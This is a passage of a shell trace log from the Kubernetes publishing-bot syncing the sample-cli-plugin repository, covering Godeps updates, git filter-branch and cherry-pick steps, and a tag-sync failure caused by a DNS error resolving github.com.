(startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/sample-cli-plugin/\") or . == \"k8s.io/sample-cli-plugin\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ '[' -z a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>\t++ git-find-merge a8c7a3fd5e707243af68b10a8a581c2c59248222 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'a8c7a3fd5e707243af68b10a8a581c2c59248222^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a8c7a3fd5e707243af68b10a8a581c2c59248222..upstream-branch --ancestry-path\n>\t+++ git rev-parse a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ local k_last_kube_merge=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.\n>\t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-api-master\n>\t+ '[' -z 52c905c45d81ff3b21b8b4b22c41492d81f38807 ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to 52c905c45d81ff3b21b8b4b22c41492d81f38807\n>\t+ echo 'Checking out k8s.io/api to 52c905c45d81ff3b21b8b4b22c41492d81f38807'\n>\t+ git checkout -q 52c905c45d81ff3b21b8b4b22c41492d81f38807\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-apimachinery-master\n>\t+ '[' -z f479c818ecf507e4efe724c5a35e07faceaa70f9 ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to f479c818ecf507e4efe724c5a35e07faceaa70f9\n>\t+ echo 'Checking out k8s.io/apimachinery to f479c818ecf507e4efe724c5a35e07faceaa70f9'\n>\t+ git checkout -q f479c818ecf507e4efe724c5a35e07faceaa70f9\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\tLooking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.\n>\t+ local dep=cli-runtime\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-cli-runtime-master\n>\t+ '[' -z 78d2d45232faafb8fd77f7cec2e20a76a985c22c ']'\n>\t+ pushd ../cli-runtime\n>\tChecking out k8s.io/cli-runtime to 78d2d45232faafb8fd77f7cec2e20a76a985c22c\n>\t+ echo 'Checking out k8s.io/cli-runtime to 78d2d45232faafb8fd77f7cec2e20a76a985c22c'\n>\t+ git checkout -q 78d2d45232faafb8fd77f7cec2e20a76a985c22c\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-client-go-master\n>\t+ '[' -z 00150196697467040ac918c70a78a55aae3ac596 ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to 00150196697467040ac918c70a78a55aae3ac596'\n>\t+ git checkout -q 00150196697467040ac918c70a78a55aae3ac596\n>\tChecking out k8s.io/client-go to 00150196697467040ac918c70a78a55aae3ac596\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>\tRemove redundant godep commits on-top of cfa3e71c45a0b3f2f440b88bd8bd2c554863f832.\n>\t+ echo 'Remove redundant godep commits on-top of cfa3e71c45a0b3f2f440b88bd8bd2c554863f832.'\n>\t+ git reset --soft -q cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ local repo=sample-cli-plugin\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'cfa3e71 Merge pull request #69322 from jpbetz/etcd-client-3.3.9' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-sample-cli-plugin-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-sample-cli-plugin-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-sample-cli-plugin-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-sample-cli-plugin-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-sample-cli-plugin-master.sh --dependencies api:master,apimachinery:master,cli-runtime:master,client-go:master --mapping-output-file '../tag-sample-cli-plugin-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tfatal: unable to access 'https://github.com/kubernetes/sample-cli-plugin/': Could not resolve host: github.com\n>\tF1011 03:28:25.070685   25707 main.go:149] Failed to fetch tags for \"origin\": exit status 128\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc430920600, 0xc42f986600, 0x5e, 0xb2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xc77880, 0xc400000003, 0xc4200bc210, 0xc1877a, 0x7, 0x95, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xc77880, 0x3, 0x97b4a5, 0x1f, 0xc42010ba58, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x97b4a5, 0x1f, 0xc42010ba58, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:149 +0x2bea\n>[11 Oct 18 03:28 UTC]: exit status 255\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=sample-cli-plugin\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/sample-cli-plugin\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=false\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=3ac3889838dec64b37e4587ccff7fc2f61ed4ca7\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 218db53f7b22bc5d8acaef772c31219e40cfab25\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=3d7d35ee8f099f4611dca06de4453f958b4b8492\n>    \t+ '[' 3d7d35ee8f099f4611dca06de4453f958b4b8492 '!=' 3ac3889838dec64b37e4587ccff7fc2f61ed4ca7 ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''3ac3889838dec64b37e4587ccff7fc2f61ed4ca7'\\'' to '\\''3d7d35ee8f099f4611dca06de4453f958b4b8492'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/sample-cli-plugin master master api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/sample-cli-plugin\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 10 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit 0e7a66c9059b61b25daf7cf2fdfc2245e77b1164.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 3d7d35ee8f099f4611dca06de4453f958b4b8492.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B master\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_base_commit=a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>    \t++ git-find-merge a94ea824eb59e92188f166c302d7995ba9002667 upstream/master\n>    \t++ tail -1\n>    \t+++ git rev-list 'a94ea824eb59e92188f166c302d7995ba9002667^1..upstream/master' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list a94ea824eb59e92188f166c302d7995ba9002667..upstream/master --ancestry-path\n>    \t+++ git rev-parse a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ local k_base_merge=a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>    \t+ git branch -f filtered-branch-base a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/sample-cli-plugin.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/sample-cli-plugin 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/sample-cli-plugin\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/sample-cli-plugin -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=1cd15df18fca6b1c3dea691eb3fb38dbc144dfec\n>    \t++ git log --first-parent --format=%H --reverse 1cd15df18fca6b1c3dea691eb3fb38dbc144dfec..HEAD\n>    \t+ f_mainline_commits=8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ echo 'Checking out branch master.'\n>    \t+ git checkout -q master\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=0e7a66c9059b61b25daf7cf2fdfc2245e77b1164\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=0e7a66c9059b61b25daf7cf2fdfc2245e77b1164\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t++ kube-commit Kubernetes-commit 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ commit-message 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t++ git show --format=%B -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ k_mainline_commit=4263c752115c3796ee5715c7de4cbc2e237809d3\n>    \t++ git-find-merge 4263c752115c3796ee5715c7de4cbc2e237809d3 upstream-branch\n>    \t++ tail -1\n>    \t+++ git rev-list '4263c752115c3796ee5715c7de4cbc2e237809d3^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 4263c752115c3796ee5715c7de4cbc2e237809d3..upstream-branch --ancestry-path\n>    \t+++ git rev-parse 4263c752115c3796ee5715c7de4cbc2e237809d3\n>    \t+ k_new_pending_merge_commit=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ '[' a8c7a3fd5e707243af68b10a8a581c2c59248222 = 4263c752115c3796ee5715c7de4cbc2e237809d3 ']'\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ '[' 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' master '!=' master ']'\n>    \t+ is-merge 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ grep -q '^Merge: '\n>    \t++ short-commit-message 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t++ git show --format=short -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ return 1\n>    \t+ local pick_args=\n>    \t+ is-merge 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ grep -q '^Merge: '\n>    \t++ short-commit-message 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t++ git show --format=short -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ return 1\n>    \t++ commit-subject 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t++ git show --format=%s -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 4263c752115c3796ee5715c7de4cbc2e237809d3: Update etcd client to 3.3.9.'\n>    \t+ local squash_commits=1\n>    \t+ godep-changes 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ '[' -n '' ']'\n>    \t+ git diff --exit-code --quiet '8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^' 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d -- Godeps/Godeps.json\n>    \t+ reset-godeps '8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^'\n>    \t+ local 'f_clean_commit=8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^'\n>    \t++ git ls-tree '8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^^{tree}' Godeps\n>    \t+ '[' -n '040000 tree b767b83efb9dba21aaa8c7d5aa292579da49992e\tGodeps' ']'\n>    \t+ git checkout '8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^' Godeps\n>    \t+ git add Godeps\n>    \t+ git commit -q -m 'sync: reset Godeps/Godeps.json' --allow-empty\n>    \t+ squash_commits=2\n>    \t+ dst_needs_godeps_update=true\n>    \t++ commit-date 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t++ git show --format=%aD -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ GIT_COMMITTER_DATE='Mon, 1 Oct 2018 16:53:57 -0700'\n>    \t+ git cherry-pick --keep-redundant-commits 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>    \t+ squash 2\n>    \t++ git rev-parse HEAD\n>    \t+ local head=c9a0be9af27d6487bed77241616d8b63f171d90c\n>    \t+ git reset -q --soft HEAD~2\n>    \t++ committer-date c9a0be9af27d6487bed77241616d8b63f171d90c\n>    \t++ git show --format=%cD -q c9a0be9af27d6487bed77241616d8b63f171d90c\n>    \t+ GIT_COMMITTER_DATE='Mon, 1 Oct 2018 16:53:57 -0700'\n>    \t+ git commit --allow-empty -q -C c9a0be9af27d6487bed77241616d8b63f171d90c\n>    \t+ '[' -z a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT '!=' a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>    \t+ local dst_parent2=HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t++ commit-subject a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t++ git show --format=%s -q a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ echo 'Cherry-picking source dropped-merge a8c7a3fd5e707243af68b10a8a581c2c59248222: Merge pull request #69322 from jpbetz/etcd-client-3.3.9.'\n>    \t++ commit-date a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t++ git show --format=%aD -q a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+ local 'date=Wed, 10 Oct 2018 17:56:46 -0700'\n>    \t+++ commit-message a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+++ git show --format=%B -q a8c7a3fd5e707243af68b10a8a581c2c59248222\n>    \t+++ echo\n>    \t+++ echo 'Kubernetes-commit: a8c7a3fd5e707243af68b10a8a581c2c59248222'\n>    \t++ GIT_COMMITTER_DATE='Wed, 10 Oct 2018 17:56:46 -0700'\n>    \t++ GIT_AUTHOR_DATE='Wed, 10 Oct 2018 17:56:46 -0700'\n>    \t++ git commit-tree -p 0e7a66c9059b61b25daf7cf2fdfc2245e77b1164 -p HEAD -m 'Merge pull request #69322 from jpbetz/etcd-client-3.3.9\n>\n>    \tUpdate etcd client to 3.3 for 1.13\n>\n>    \tKubernetes-commit: a8c7a3fd5e707243af68b10a8a581c2c59248222' 'HEAD^{tree}'\n>    \t+ local dst_new_merge=a55a223b8836701d39e3dd202f74329529e8cd5b\n>    \t+ git reset -q --hard a55a223b8836701d39e3dd202f74329529e8cd5b\n>    \t+ fix-godeps api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=a55a223b8836701d39e3dd202f74329529e8cd5b\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps api:master,apimachinery:master,cli-runtime:master,client-go:master k8s.io false Kubernetes-commit\n>    \t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    